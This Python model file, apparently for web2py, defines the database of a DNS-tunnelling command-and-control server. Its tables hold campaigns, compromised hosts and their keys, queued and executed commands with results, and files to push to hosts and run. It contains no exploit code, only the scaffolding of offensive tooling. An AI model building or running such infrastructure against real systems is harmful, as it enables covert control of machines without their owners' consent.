# -*- coding: utf-8 -*-
# -*- coding: utf-8 -*-
from netifaces import interfaces, ifaddresses, AF_INET
for ifaceName in interfaces():
    addresses = [i['addr'] for i in ifaddresses(ifaceName).setdefault(AF_INET, [{'addr':'No IP addr'}] )]
addresses.append("Custom IP")

db.define_table('campaign',
                Field('name', 'string',requires=IS_NOT_EMPTY()),
                Field('timestamp', 'datetime',readable=False,writable=False))
db.define_table('campaign_details',
                Field('campaign_id',db.campaign,readable=False,writable=False),
                Field('server_type',requires = IS_IN_SET({'DNS':'DNS Server'}, zero=None)),
                Field('connection_type',requires = IS_IN_SET({'D':'Direct DNS Queries', 'R':'Recursive DNS Queries'}, zero=None)),
                Field('server_domain',label='Authoritative Domain:',default=''),
                Field('keye','text',readable=False,writable=False),
                Field('keyn','text',readable=False,writable=False))
db.define_table('server',
                Field('listening_ip',requires = IS_IN_SET(addresses, zero='Select a local interface')),
                Field('custom_listening_ip',label='Custom IP',requires=IS_EMPTY_OR(IS_IPV4())),
                Field('port',default=53,readable=False,writable=False),
                Field('server_running','boolean',default=False,readable=False,writable=False),
                Field('server_PID',default=-1,readable=False,writable=False),
                Field('privkey','text',readable=False,writable=False),
                Field('log_level',label='Log Level',requires=IS_IN_SET(["DEBUG","INFO","WARNING","ERROR","CRITICAL"]),default="INFO"))
db.define_table('payload_details',
                Field('campaign_id',db.campaign,readable=False,writable=False),
                Field('polling_interval','integer',default=10000))
db.define_table('settings',
                Field('name', 'string', require=IS_NOT_EMPTY()),
                Field('value','string')
                )
db.define_table('hosts',
                Field('name', 'string', require=IS_NOT_EMPTY()),
                Field('mac','string'),
                Field('symmetric_key', 'text'),
                Field('campaign_id','integer',default=0),
                Field('last_seen','text'),
                Field('terminated','boolean',default='False'))
db.define_table('executed_commands',
                Field('host_id', 'integer', require=IS_NOT_EMPTY()),
                Field('command_id', 'integer'),
                Field('command','text'),
                Field('result','text'),
                Field('timestamp','text'))
db.define_table('next_commands',
                Field('host_id', 'integer', readable=False,writable=False),
                Field('next_command', 'text'),
                Field('timestamp','datetime',readable=False,writable=False),
                Field('state','text',readable=False,writable=False))
db.define_table('next_files',
                Field('host_id', 'integer', require=IS_NOT_EMPTY()),
                Field('file_name','text'),
                Field('uploaded_file', 'upload',label='Select file'),
                Field('remote_path', 'text'),
                Field('turbo', 'boolean'),
                Field('insecure', 'boolean',label='Send unencrypted'),
                Field('execute','boolean',label='Execute it'),
                Field('timestamp','datetime'),
                Field('direction', 'integer'),
                Field('state','text'))

dir_path = request.folder
server_logs=os.path.join(dir_path,"private","server.log")
db.settings.update_or_insert(name="SERVER_LOGS",value=server_logs)
db.settings.update_or_insert(name="WIN_MCS_PATH",value="C:\\Program Files\\Mono\\Bin\\mcs.bat")
db.settings.update_or_insert(name="PYTHON",value="/root/giuliano/Python-3.5.8/python")
